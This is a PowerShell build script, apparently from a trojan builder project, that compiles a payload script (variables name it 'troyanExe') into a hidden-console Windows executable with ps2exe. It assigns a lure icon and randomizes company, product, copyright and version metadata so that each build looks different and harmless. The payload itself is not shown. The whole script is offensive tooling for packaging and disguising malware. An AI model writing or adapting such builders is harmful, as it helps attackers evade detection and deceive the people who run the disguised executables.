param (
    [string]$serverName, [string]$packId = ""
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName
Set-Location -Path $scriptDir

function Get-RandomString {
    -join ((97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
}

function Remove-FileIfExists {
    param ([string]$filePath)
    if (Test-Path $filePath) {
        Remove-Item $filePath
    }
}

function Get-RandomVersion {
    "$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random))"
}

if (-not (Test-Path -Path $server.userTroyanIco))
{
    Copy-Item -Path $server.defaultIco -Destination $server.troyanIco -Force
} else {
    Copy-Item -Path $server.userTroyanIco -Destination $server.troyanIco -Force
}

Remove-FileIfExists -filePath $server.troyanExe


$outputFile = $server.userTroyanExe    
$iconFile = $server.troyanIco
 
if ([string]::IsNullOrEmpty($packId) -eq $false) {
    $pack = $server.pack.items | Where-Object { $_.id -eq $packId }
    if (-not $pack) {
        throw "Item with id '$packId' not found in pack items."
    }
    $outputFile= $pack.packFileExe
    if ([string]::IsNullOrEmpty($pack.icon) -eq $false) {
        if ((Test-Path -Path $pack.iconFile))
        {
            $iconFile = $pack.iconFile
        }
    }
}   

Invoke-ps2exe `
    -inputFile $server.holderRelease `
    -outputFile $server.troyanExe `
    -iconFile $iconFile `
    -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
    -company (Get-RandomString) `
    -product (Get-RandomString) `
    -title (Get-RandomString) `
    -copyright (Get-RandomString) `
    -trademark (Get-RandomString) `
    -version (Get-RandomVersion)




Write-Host "Output exe: $outputFile"

Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
Copy-Item -Path $server.troyanExe -Destination $outputFile -Force

